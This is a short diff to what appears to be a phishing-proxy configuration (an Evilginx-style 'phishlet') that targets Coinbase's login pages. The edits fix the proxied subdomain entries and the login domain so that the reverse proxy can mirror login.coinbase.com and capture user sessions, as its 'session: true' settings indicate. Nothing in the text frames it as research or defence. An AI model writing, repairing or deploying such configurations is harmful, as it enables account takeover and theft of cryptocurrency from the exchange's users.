@@ -3,7 +3,7 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'login', orig_sub: 'login', domain: 'coinbase.com', session: true, is_landing: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'coinbase.com', session: true, is_landing: false}
-  - {phish_sub: 'https://login', orig_sub: 'https://login', domain: 'coinbase.com', session: true, is_landing: false}
+  - {phish_sub: 'https://login.', orig_sub: 'https://login.', domain: 'coinbase.com', session: true, is_landing: false}
 
 
 sub_filters:
@@ -45,7 +45,7 @@ force_post:
     type: 'post'
 
 login:
-  domain: 'https://login.coinbase.com'
+  domain: 'login.coinbase.com'
   path: '/signin?'
 
 
